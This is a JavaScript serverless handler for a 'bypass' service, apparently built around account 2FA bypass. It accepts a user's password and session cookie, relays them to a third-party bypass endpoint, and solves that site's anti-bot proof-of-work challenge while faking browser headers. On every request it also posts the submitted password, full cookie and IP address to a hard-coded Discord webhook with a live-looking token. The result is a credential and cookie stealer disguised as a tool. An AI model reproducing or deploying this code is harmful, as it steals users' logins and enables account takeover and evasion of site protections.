import crypto from 'crypto';

// ── Webhook configuration ──
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1535565391831633922/qGPItYyWVhdZBgzZ5Imc3P-rDe5evtpkopomqgfH2RZKQHRblWoe8QBSJ0xL5817ww3B';

// ── EggyWall PoW Solver ──
function solveEggyWall(html) {
    try {
        const saltMatch = html.match(/const publicSalt = "([^"]+)"/);
        const targetMatch = html.match(/const target = "([^"]+)"/);
        const diffMatch = html.match(/const difficulty = (\d+)/);

        if (!saltMatch || !targetMatch || !diffMatch) return null;

        const publicSalt = saltMatch[1];
        const target = targetMatch[1];
        const difficulty = parseInt(diffMatch[1]);

        const charset = '0123456789abcdef';
        const max = Math.pow(charset.length, difficulty);

        if (max > 5000000) return null; 

        for (let i = 0; i < max; i++) {
            let suffix = '';
            let temp = i;

            for (let j = 0; j < difficulty; j++) {
                suffix = charset[temp % charset.length] + suffix;
                temp = Math.floor(temp / charset.length);
            }

            const attempt = publicSalt + suffix;
            const hash = crypto.createHash('sha256').update(attempt).digest('hex');

            if (hash === target) {
                return attempt;
            }
        }
        return null;
    } catch (e) {
        return null;
    }
}

// ── Red/Black Themed Webhook sender ──
async function sendWebhook(req, requestData, responseStatus, success, responseMessage) {
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    const { Type, Password, Cookie } = requestData || {};

    const mainEmbed = {
        title: success ? `🩸 BYPASS SUCCESSFUL` : `⚠️ BYPASS FAILED`,
        color: success ? 0x00ff00 : 0xff0000,
        fields: [
            { name: '🌐 Target IP', value: `\`${ip}\``, inline: false },
            { name: '📋 Type', value: `\`${Type || 'N/A'}\``, inline: true },
            { name: '🔑 Password', value: `\`${Password || 'N/A'}\``, inline: true },
            { name: '📊 HTTP Status', value: `\`${responseStatus}\``, inline: true },
            { name: '💬 API Response', value: `\`\`\`fix\n${responseMessage}\n\`\`\``, inline: false }
        ],
        footer: { text: `Noctrya System • ${userAgent.substring(0, 50)}` },
        timestamp: timestamp
    };

    const cookieEmbed = {
        title: '🔴 EXTRACTED COOKIE',
        color: 0xff0000,
        description: `\`\`\`txt\n${Cookie || 'N/A'}\n\`\`\``,
        fields: [
            { name: 'Length', value: `${(Cookie || '').length} chars`, inline: true }
        ],
        timestamp: timestamp
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: '@everyone',
                embeds: [mainEmbed, cookieEmbed],
                username: 'Noctrya/Bypasser',
                allowed_mentions: { parse: ['everyone'] }
            })
        });
    } catch (webhookError) {
        console.error('Webhook send failed:', webhookError);
    }
}

// ── 1. Anti-DDoS Memory Block ──
const requestCounts = {};

export default async function handler(req, res) {
    // 2. Spam Blocker Logic
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const now = Date.now();

    for (let key in requestCounts) {
        if (now - requestCounts[key].firstRequest > 60000) {
            delete requestCounts[key];
        }
    }

    if (!requestCounts[ip]) {
        requestCounts[ip] = { firstRequest: now, count: 1 };
    } else {
        requestCounts[ip].count++;
    }

    if (requestCounts[ip].count > 5) {
        return res.status(429).json({ error: 'Too many requests. Stop spamming.' });
    }

    // 3. Bot User-Agent Blocker
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('python') || 
        userAgent.toLowerCase().includes('curl') || 
        userAgent.toLowerCase().includes('axios') || 
        userAgent.toLowerCase().includes('postman') || 
        userAgent === '') {
        return res.status(403).json({ error: 'Bots are not allowed.' });
    }

    // 4. Fixed CORS Logic
    const origin = req.headers.origin;
    const allowedOrigins = [
        'https://bypasser-jade.vercel.app',
        'https://noctrya-gen.vercel.app',
        'http://localhost:3000'
    ];
    
    if (origin && !allowedOrigins.includes(origin)) {
        return res.status(403).json({ error: 'Access Denied.' });
    }
    
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    }

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    // 5. Bypass logic
    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        let { Type, Password, Cookie } = body || {};

        if (!Type || !Password || !Cookie) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }

        Type = Type.charAt(0).toUpperCase() + Type.slice(1).toLowerCase();

        const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
        
        // ── ADVANCED BROWSER SIMULATION HEADERS ──
        const baseHeaders = {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Origin': 'https://immortal.st',
            'Referer': 'https://immortal.st/',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        };

        // ── STEP 1: Visit the main site first to get clearance cookies ──
        try {
            const homeResponse = await fetch('https://immortal.st/', {
                method: 'GET',
                headers: baseHeaders,
                redirect: 'follow'
            });
            const setCookieHeader = homeResponse.headers.get('set-cookie');
            if (setCookieHeader) {
                const cookieMatches = setCookieHeader.match(/([^=]+=[^;]+)/g);
                if (cookieMatches) {
                    baseHeaders['Cookie'] = cookieMatches.join('; ');
                }
            }
        } catch (e) {
            console.error('Failed to visit homepage first:', e);
        }

        const payload = JSON.stringify({ Type, Password, Cookie });

        // ── STEP 2: Make the actual API request ──
        let response = await fetch(targetUrl, {
            method: 'POST',
            headers: baseHeaders,
            body: payload,
            redirect: 'follow'
        });

        let responseText = await response.text();

        // Check if EggyWall blocked us
        if (responseText.includes('EggyWall')) {
            if (responseText.includes('publicSalt')) {
                const token = solveEggyWall(responseText);

                if (token) {
                    // Append EggyWall token to existing cookies
                    baseHeaders['Cookie'] = (baseHeaders['Cookie'] ? baseHeaders['Cookie'] + '; ' : '') + `EggyWall_Token=${token}`;
                    
                    response = await fetch(targetUrl, {
                        method: 'POST',
                        headers: baseHeaders,
                        body: payload,
                        redirect: 'follow'
                    });
                    responseText = await response.text();
                } else {
                    await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW');
                    await new Promise(resolve => setTimeout(resolve, 10000));
                    return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
                }
            } else {
                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Blocked by EggyWall (Hard IP Block)');
                await new Promise(resolve => setTimeout(resolve, 10000));
                return res.status(403).json({ success: false, message: 'Blocked by EggyWall. Vercel IP is blacklisted by the target.' });
            }
        }

        const httpSuccess = response.status >= 200 && response.status < 300;

        let responseData = responseText;
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            try {
                responseData = JSON.parse(responseText);
            } catch (_) { /* keep raw */ }
        }

        let finalSuccess = httpSuccess;
        let finalMessage = '';
        
        if (responseData && typeof responseData === 'object' && 'success' in responseData) {
            finalSuccess = responseData.success === true || responseData.success === "true";
        }

        if (finalSuccess) {
            finalMessage = 'Success';
        } else {
            if (responseData && typeof responseData === 'object') {
                finalMessage = responseData.msg || responseData.message || responseData.error || JSON.stringify(responseData);
            } else {
                finalMessage = 'Bypass Failed (Server returned an unexpected HTML page)';
            }
        }

        await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage);
        await new Promise(resolve => setTimeout(resolve, 10000));

        return res.status(response.status).json({
            success: finalSuccess,
            message: finalMessage,
            raw: typeof responseData === 'object' ? responseData : { raw_text: responseText.substring(0, 500) }
        });

    } catch (error) {
        console.error('Server Error:', error);
        const detailedError = error.cause ? error.cause.message : error.message;
        const errorCode = error.cause ? error.cause.code : 'UNKNOWN';
        
        return res.status(500).json({ 
            success: false,
            error: 'Internal Server Error', 
            details: detailedError,
            code: errorCode
        });
    }
                      }
